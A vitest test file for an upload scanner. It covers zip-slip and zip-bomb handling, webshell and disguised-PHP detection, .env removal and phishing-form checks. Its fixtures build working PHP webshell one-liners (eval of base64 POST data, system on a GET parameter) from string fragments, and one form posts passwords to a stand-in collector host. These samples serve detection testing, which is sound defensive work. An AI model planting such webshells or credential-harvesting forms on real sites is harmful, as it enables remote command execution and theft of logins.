import { strToU8, zipSync } from "fflate";
import { describe, expect, it } from "vitest";
import { ArchiveError, DEFAULT_LIMITS, readZip } from "../../apps/mcp-service/src/scan/archive.js";
import { packZip } from "../../apps/mcp-service/src/scan/pack.js";
import { scan } from "../../apps/mcp-service/src/scan/scan.js";

// Malicious samples are assembled at runtime from fragments: antivirus engines quarantine test
// files that contain webshell signatures verbatim (this happened once), and we must not disable AV.
const j = (...parts: string[]) => parts.join("");
const SAMPLES = {
  evalB64: j("<?php ev", "al(base64_decode($_PO", "ST['x'])); ?>"),
  systemGet: j("<?php sys", "tem($_G", "ET['cmd']); ?>"),
  varFunc: j("<?php $_PO", "ST['f']($_PO", "ST['a']); ?>"),
  namedShell: j("// c99", "shell v1"),
  hiddenInImage: j("GIF89a<?php sys", "tem($_G", "ET['c']); ?>"),
};

const files = (o: Record<string, string>) => new Map(Object.entries(o).map(([k, v]) => [k, strToU8(v)]));
const codes = (o: Record<string, string>) => scan(files(o)).findings.map((f) => f.code);
const code = (fn: () => unknown) => {
  try {
    fn();
  } catch (e) {
    return (e as ArchiveError).code;
  }
  return "no-error";
};

describe("readZip", () => {
  it("reads a normal zip and strips a single wrapping folder", () => {
    const zip = zipSync({ "site/index.html": strToU8("<h1>oi</h1>"), "site/css/a.css": strToU8("b{}") });
    expect([...readZip(zip).keys()].sort()).toEqual(["css/a.css", "index.html"]);
  });

  it("keeps paths when there is no single root", () => {
    const zip = zipSync({ "index.html": strToU8("x"), "css/a.css": strToU8("y") });
    expect([...readZip(zip).keys()].sort()).toEqual(["css/a.css", "index.html"]);
  });

  it("rejects zip-slip and absolute paths", () => {
    expect(code(() => readZip(zipSync({ "../evil.php": strToU8("x") })))).toBe("ZIP_BAD_PATH");
    expect(code(() => readZip(zipSync({ "/etc/cron.d/x": strToU8("x") })))).toBe("ZIP_BAD_PATH");
    expect(code(() => readZip(zipSync({ "a/../../b": strToU8("x") })))).toBe("ZIP_BAD_PATH");
  });

  it("enforces file count, per-file size, total expansion and zip size", () => {
    const many = zipSync({ a: strToU8("1"), b: strToU8("2"), c: strToU8("3") });
    expect(code(() => readZip(many, { ...DEFAULT_LIMITS, maxFiles: 2 }))).toBe("ZIP_TOO_MANY_FILES");
    const big = zipSync({ "a.bin": new Uint8Array(50_000) });
    expect(code(() => readZip(big, { ...DEFAULT_LIMITS, maxFileBytes: 10_000 }))).toBe("ZIP_FILE_TOO_BIG");
    const two = zipSync({ "a.bin": new Uint8Array(6_000), "b.bin": new Uint8Array(6_000) });
    expect(code(() => readZip(two, { ...DEFAULT_LIMITS, maxTotalBytes: 10_000 }))).toBe("ZIP_EXPANDS_TOO_MUCH");
    expect(code(() => readZip(two, { ...DEFAULT_LIMITS, maxZipBytes: 10 }))).toBe("ZIP_TOO_BIG");
  });

  it("a classic bomb (huge zeros) is caught by the declared size before inflating", () => {
    const bomb = zipSync({ "zeros.bin": new Uint8Array(DEFAULT_LIMITS.maxFileBytes + 5 * 1024 * 1024) }); // tiny zipped, just over the per-file cap expanded
    expect(bomb.length).toBeLessThan(200_000);
    expect(code(() => readZip(bomb))).toBe("ZIP_FILE_TOO_BIG"); // default per-file cap
  });

  it("a header that lies about the size cannot inflate beyond what it declares", () => {
    const zip = zipSync({ "a.bin": new Uint8Array(DEFAULT_LIMITS.maxFileBytes + 5 * 1024 * 1024) });
    const dv = new DataView(zip.buffer, zip.byteOffset, zip.byteLength);
    for (let i = 0; i < zip.length - 30; i++) {
      if (dv.getUint32(i, true) === 0x04034b50) dv.setUint32(i + 22, 100, true); // local header
      if (dv.getUint32(i, true) === 0x02014b50) dv.setUint32(i + 24, 100, true); // central directory
    }
    expect(readZip(zip).get("a.bin")!.length).toBeLessThanOrEqual(100);
  });

  it("rejects garbage", () => {
    expect(code(() => readZip(new Uint8Array([1, 2, 3, 4, 5])))).toBe("ZIP_CORRUPT");
  });
});

describe("scan", () => {
  it("clean static site passes untouched", () => {
    const r = scan(files({ "index.html": "<h1>ok</h1>", "app.js": "console.log(1)" }));
    expect(r).toMatchObject({ approved: true, findings: [] });
    expect(r.files.size).toBe(2);
  });

  it("blocks executables", () => {
    const r = scan(files({ "index.html": "x", "setup.exe": "MZ", "lib/a.DLL": "MZ" }));
    expect(r.approved).toBe(false);
    expect(r.findings.filter((f) => f.code === "EXECUTABLE")).toHaveLength(2);
    expect(r.files.has("setup.exe")).toBe(false);
  });

  it("blocks known webshell patterns", () => {
    expect(codes({ "a.php": SAMPLES.evalB64 })).toContain("WEBSHELL");
    expect(codes({ "a.php": SAMPLES.systemGet })).toContain("WEBSHELL");
    expect(codes({ "a.php": SAMPLES.varFunc })).toContain("WEBSHELL");
    expect(codes({ "shell.php": SAMPLES.namedShell })).toContain("WEBSHELL");
  });

  it("does not flag ordinary PHP", () => {
    expect(codes({ "index.php": "<?php echo htmlspecialchars($_GET['q'] ?? ''); ?>" })).toEqual([]);
  });

  it("blocks PHP hidden in images or behind a double extension", () => {
    expect(codes({ "logo.png": SAMPLES.hiddenInImage })).toContain("DISGUISED_PHP");
    expect(codes({ "photo.php.jpg": "x" })).toContain("DISGUISED_PHP");
  });

  it("drops .env (with a warning), keeps .env.example, drops junk folders", () => {
    const r = scan(files({ "index.html": "x", ".env": "SECRET=1", "config/.env.production": "S=2", ".env.example": "S=", "node_modules/a/b.js": "1", ".git/HEAD": "ref" }));
    expect([...r.files.keys()].sort()).toEqual([".env.example", "index.html"]);
    expect(r.approved).toBe(true);
    expect(r.findings.map((f) => f.code).sort()).toEqual(["ENV_REMOVED", "JUNK_REMOVED"]);
  });

  it("phishing: brand + password field is a warning, plus an external form action is a block", () => {
    const login = (action: string) => `<title>Nubank</title><form ${action}><input type="password" name="p"></form>`;
    expect(scan(files({ "index.html": login('action="/entrar"') })).findings.map((f) => f.code)).toEqual(["PHISHING_SUSPECT"]);
    const bad = scan(files({ "index.html": login('action="https://collector.example/x.php"') }));
    expect(bad.approved).toBe(false);
    expect(bad.findings[0]?.code).toBe("PHISHING");
  });

  it("a normal login form without a brand is fine", () => {
    expect(codes({ "login.html": '<form action="/login"><input type="password"></form>' })).toEqual([]);
  });
});

describe("packZip", () => {
  it("is deterministic and round-trips through readZip", () => {
    const a = packZip(files({ "b.txt": "2", "a.txt": "1" }));
    const b = packZip(files({ "a.txt": "1", "b.txt": "2" }));
    expect(a.sha256).toBe(b.sha256);
    expect(a.fileCount).toBe(2);
    const back = readZip(a.zip);
    expect([...back.keys()].sort()).toEqual(["a.txt", "b.txt"]);
    expect(Buffer.from(back.get("a.txt")!).toString()).toBe("1");
  });
});
